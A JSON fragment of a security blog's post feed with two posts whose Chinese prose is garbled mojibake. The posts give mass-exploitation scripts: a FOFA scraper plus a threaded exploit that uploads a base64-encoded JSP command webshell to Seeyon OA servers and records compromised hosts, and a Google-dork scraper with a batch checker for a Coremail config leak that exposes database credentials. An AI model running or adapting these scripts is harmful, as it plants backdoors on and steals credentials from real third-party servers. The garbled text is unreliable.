","link":"https://www.svenbeast.com/post/discuzml33-lou-dong-fu-xian-ji-fen-xi-fu-poc/"},{"title":"è‡´è¿œOAæ‰¹é‡getshellåˆ·SRC","content":"æ­¥éª¤1ï¼šåˆ©ç”¨fofaæœç´¢ç›®æ ‡ï¼Œç„¶åä¿å­˜æˆ1.htmlç½‘é¡µåˆ°fofa.pyåŒä¸€è·¯å¾„ä¸‹ usageï¼šctrl+s æ­¥éª¤2ï¼šç”¨fofa.py å¯¼å‡ºåŸŸåå’Œipï¼Œå› ä¸ºfofaçš„å¯¼å‡ºå’Œapiéƒ½è¦RMBï¼Œè„šæœ¬å†™çš„ä¸å¥½ï¼Œè§è°…äº†ï¼Œä½†èƒœåœ¨æ¯”æ‰‹åŠ¨å¿«ä¸€äº› -.- ! usageï¼špython2 fofa.py #coding=utf-8 #python2 #By sven'beast import sys import requests from lxml import etree # def check_url(url): with open('1.html','r') as f: text=f.read() html = etree.HTML(text) results = html.xpath('//*[@id=&quot;ajax_content&quot;]/div/div/div/a') results2 = html.xpath(&quot;//div[@class='ip-no-url']//text()&quot;) with open('url.txt','a') as s: for i in results: print i.get('href').split('/')[2] url=i.get('href').split('/')[2] s.write('http://'+url) s.write('\\n') with open('url.txt','a') as s: for i in results2: ip='http://'+i.strip() print(ip) s.write(ip) s.write('\\n') æ­¥éª¤3ï¼šç”¨poc.pyæ£€æµ‹ä¸€ä¸‹ï¼Œç”Ÿæˆsuccess.txtï¼Œè¿™é‡Œæ³¨æ„çš„æ˜¯ï¼Œä¼šç›´æ¥å†™å…¥cmdé©¬ï¼Œæ•æ„Ÿç›®æ ‡è¯·è‡ªå·±æ³¨æ„ã€‚ psï¼šè¿™ä¸ªè„šæœ¬å¼„äº†å¾ˆé•¿æ—¶é—´ï¼Œæ²¡åŠæ³•ï¼Œèœ~ï¼Œrequests.postè¿™é‡Œæ€»æ˜¯æŠ¥é”™ï¼ŒæŠ“ç‹‚ï¼Œä¹Ÿæ²¡äººå¯ä»¥é—® -.- ! usageï¼špython3 poc.py #!/usr/bin/env python3 #-*- encoding:utf-8 -*- #By sven'beast import base64 import requests import threading import queue q=queue.Queue() file=open('url.txt') for x in file.readlines(): q.put(x.strip()) def scan(): while not q.empty(): url=q.get() headers={'Content-Type':'text/xml','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:52.0) Gecko/20100101 Firefox/52.'} post_payload1=&quot;REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U=&quot; post_payload1 = base64.b64decode(post_payload1) requests.packages.urllib3.disable_warnings() try: post=requests.post(url=url+'/seeyon/htmlofficeservlet',data=post_payload1,headers=headers,verify=False,timeout=10) r = requests.get(url=url+'/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+echo%20unsafe',headers=headers,timeout=10,verify=False) if 'unsafe' in r.text: print ('Getshell Success:'+url+'/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+echo%20unsafe'+'\\n') with open('success.txt','a') as f: f.write(url+'/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+echo%20unsafe'+'\\n') else: print ('Getshell fail:'+url+'\\n') except: print ('Getshell fail:'+url+ ' time out.'+'\\n') th=[] th_num=10 for x in range(th_num): t=threading.Thread(target=scan) th.append(t) for x in range(th_num): th[x].start() for x in range(th_num): th[x].join() æ­¥éª¤4ï¼šæ‰“å¼€success.txtå¤åˆ¶é“¾æ¥å»æ‰§è¡Œå‘½ä»¤å§ï¼Œæäº¤SRCï¼Œå½“ç„¶æˆ‘è‚¯å®šæŠ¢ä¸è¿‡å„ä½å¤§ä½¬çš„ã€‚ ä»£ç å·²ç»æä¾›äº†ï¼Œå¯ä»¥è‡ªå·±å¤åˆ¶ï¼ŒåŒæ—¶ä¹Ÿåˆ†äº«äº†ç™¾åº¦äº‘å’Œé™„ä»¶ é“¾æ¥: https://pan.baidu.com/s/1xfcxfk16PanOtjUBJmKdxQ æå–ç : xrrq è§£å‹å¯†ç ï¼šsvenbeast PSï¼šå› åšå®¢é‡å»ºï¼Œç‰¹æ„å°†æœ¬äººæ–‡ç« ä»Toolsè½¬ç§»å›æ¥ï¼Œå¦‚æœ‰å½±å“ï¼Œå¯è”ç³»åˆ å¸– æ–‡ç« é“¾æ¥ï¼ˆæ¥ç‚¹ä¸ªé¡¶å¯å¥½~ï¼‰ï¼šhttps://www.t00ls.net/thread-51610-1-1.html ","link":"https://www.svenbeast.com/post/zhi-yuan-oa-pi-liang-getshell-shua-src/"},{"title":"coremailæ‰¹é‡åˆ·src","content":" ç”¨æ¥å°æ‰¹é‡åˆ·srcçš„æ´æ˜¯hwè¿™å‡ å¤©æ›å‡ºçš„coremailçš„ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œé‡çº§å¤Ÿï¼Œæ‰€ä»¥å¯å ªä¸€æˆ˜ åœ¨æ­¤å¯¹å†™coremailçš„POCçš„ä½œè€…è¡¨ç¤ºæ„Ÿè°¢la -.-! é¦–å…ˆæ­¥éª¤1ï¼šåˆ©ç”¨googleè¯­æ³•åˆ—å‡ºæœç´¢ç»“æœå¹¶ä¿å­˜ç½‘é¡µ# è¿™é‡Œå›¾ç‰‡é‡Œçš„googleè¯­æ³•æ˜¯ inurl:coremailï¼ˆå…¶ä»–è¯­æ³•éœ€è‡ªè¡Œæ„é€ ï¼Œæœ€å¥½åŠ ä¸Šä¸­æ–‡å…³é”®å­—ï¼‰ï¼Œç„¶åç¿»åˆ°ç¬¬2é¡µï¼Œctrl+så°†é¡µé¢ä¿å­˜ä¸º1.html psï¼šæ‹¥æœ‰ZoomEyeï¼ŒFofaï¼Œshodanè´¦å·çš„ç•¥è¿‡å³å¯ -.- æ­¥éª¤2ï¼šè·å–htmlæ–‡ä»¶ä¸­çš„coremaileåŸŸå# usageï¼špython2 damain.py #coding=utf-8 import sys import requests from lxml import etree # def check_url(url): with open('1.html','r') as f: text=f.read() html = etree.HTML(text) results = html.xpath('//*[@id=&quot;rso&quot;]/div[1]/div/div/div/div/div/a') with open('ip.txt','a') as s: for i in results: print i.get('href').split('/')[2] url=i.get('href').split('/')[2] s.write('http://'+url) s.write('\\n') ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆip.txt Psï¼šè®°å¾—æŠŠç”Ÿæˆçš„ip.txtæ–‡ä»¶ä¸­google.comåç¼€çš„ç½‘ç«™åˆ æ‰ï¼Œè¿™ä¸ªæ˜¯googleç¿»è¯‘ï¼Œä¸åˆ æ‰æœ‰äº›æµªè´¹æ£€æµ‹æ—¶é—´ï¼Œæ¯•ç«Ÿæ˜¯å•çº¿ç¨‹ï¼Œhhã€‚ æ­¥éª¤3ï¼šæ‰¹é‡éªŒè¯æ¼æ´# usageï¼špython2 poc.py #-*- Coding: utf-8 -*- import requests,sys def mailsmsPoC(url): url = url + &quot;/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/&quot; try: r = requests.get(url,timeout=8000) if (r.status_code != '404') and (&quot;/home/coremail&quot; in r.text): print &quot;mailsms is vulnerable: {0}&quot;.format(url) with open('vul.txt', 'a') as f: f.write(url + '\\n') else: print &quot;mailsms is safe!&quot; except Exception as e: print &quot;######time out######&quot; if __name__ == '__main__': try: mailsmsPoC(sys.argv[1]) except: print &quot;python poc.py&quot; file = open('ip.txt', 'r') for f in file.readlines(): url = f.strip('\\r\\n') mailsmsPoC(url) æ­¥éª¤4ï¼šå­˜åœ¨æ¼æ´çš„ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆvul.txtï¼Œç›´æ¥å¤åˆ¶urlç²˜è´´åˆ°ç½‘é¡µä¸Šï¼Œctr+fæœç´¢databaseå°±å¯ä»¥çœ‹åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç ä¸€äº›ä¿¡æ¯äº†,å°±å¯ä»¥å¼€å§‹æˆªå›¾è¿›è¡Œsrcæäº¤äº†# ç»“æŸï¼šè·å–åŸŸåæ—¶ï¼Œåå¾—åˆ°çš„åŸŸåæ˜¯ç¼–è¾‘è¿›ip.txtæ–‡ä»¶çš„ï¼Œæ‰€ä»¥ä¸å¿…æ‹…å¿ƒå¤šæ¬¡è·å–åŸŸååæ›¿æ¢å‰é¢å·²è·å–çš„ã€‚ PSï¼šå› åšå®¢é‡å»ºï¼Œç‰¹æ„å°†æœ¬äººæ–‡ç« ä»åœˆå­è½¬ç§»å›æ¥ï¼Œå¦‚æœ‰å½±å“ï¼Œå¯è”ç³»åˆ å¸– æ–‡ç« é“¾æ¥ï¼ˆæ¥ç‚¹ä¸ªé¡¶å¯å¥½~ï¼‰ï¼šhttps://www.secquan.org/Discuss/1069678 ","link":"https://www.svenbeast.com/post/coremail-pi-liang-shua-src/"}]}